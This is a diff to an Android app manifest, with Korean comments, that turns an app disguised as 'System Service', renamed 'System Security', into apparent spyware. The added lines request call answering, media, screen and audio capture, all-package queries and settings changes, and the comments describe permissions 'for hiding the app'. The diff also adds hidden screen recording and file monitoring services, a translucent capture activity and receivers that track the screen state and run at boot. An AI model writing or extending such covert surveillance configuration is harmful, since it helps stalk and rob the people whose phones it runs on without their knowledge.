@@ -13,11 +13,15 @@
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS"/>
 
     <!-- 파일 접근 권한 -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
 
     <!-- 연락처 접근 권한 -->
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
@@ -27,32 +31,48 @@
     <uses-permission android:name="android.permission.CAMERA"/>
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
 
+    <!-- 화면 녹화 권한 -->
+    <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT"/>
+    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"/>
+
     <!-- 네트워크 권한 -->
     <uses-permission android:name="android.permission.INTERNET"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
 
     <!-- 시스템 관련 권한 -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
 
     <!-- 앱 사용 통계 권한 -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
 
     <!-- Accessibility Service 권한 -->
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
 
-    <!-- 기타 권한 -->
+    <!-- 기타 고급 권한 -->
     <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.EXPAND_STATUS_BAR"/>
+
+    <!-- 앱 숨기기를 위한 권한 -->
+    <uses-permission android:name="android.permission.HIDE_NON_SYSTEM_OVERLAY_WINDOWS"/>
 
     <application
-        android:label="System Service"
+        android:label="System Security"
         android:name="${applicationName}"
         android:icon="@mipmap/ic_launcher"
-        android:requestLegacyExternalStorage="true">
+        android:requestLegacyExternalStorage="true"
+        android:allowBackup="false"
+        android:hardwareAccelerated="true">
 
         <activity
             android:name=".MainActivity"
@@ -62,7 +82,8 @@
             android:theme="@style/LaunchTheme"
             android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
             android:hardwareAccelerated="true"
-            android:windowSoftInputMode="adjustResize">
+            android:windowSoftInputMode="adjustResize"
+            android:excludeFromRecents="false">
 
             <meta-data
                 android:name="io.flutter.embedding.android.NormalTheme"
@@ -73,6 +94,12 @@
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
+
+        <!-- 화면 녹화 액티비티 -->
+        <activity
+            android:name=".activities.ScreenCaptureActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <!-- SMS 수신 브로드캐스트 리시버 -->
         <receiver android:name=".receivers.SmsReceiver"
@@ -85,11 +112,21 @@
         <!-- 부팅 완료 리시버 -->
         <receiver android:name=".receivers.BootReceiver"
             android:exported="true">
-            <intent-filter>
+            <intent-filter android:priority="1000">
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
                 <action android:name="android.intent.action.PACKAGE_REPLACED"/>
                 <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+
+        <!-- 화면 켜짐/꺼짐 리시버 -->
+        <receiver android:name=".receivers.ScreenStateReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
             </intent-filter>
         </receiver>
 
@@ -112,6 +149,18 @@
             android:foregroundServiceType="location|dataSync"
             android:exported="false" />
 
+        <!-- 화면 녹화 서비스 -->
+        <service
+            android:name=".services.ScreenRecordingService"
+            android:foregroundServiceType="mediaProjection"
+            android:exported="false" />
+
+        <!-- 파일 모니터링 서비스 -->
+        <service
+            android:name=".services.FileMonitoringService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
         <meta-data
             android:name="flutterEmbedding"
             android:value="2" />
@@ -126,5 +175,7 @@
         <intent>
             <action android:name="android.intent.action.MAIN" />
         </intent>
+        <!-- 모든 패키지 쿼리 -->
+        <package android:name="*" />
     </queries>
 </manifest>
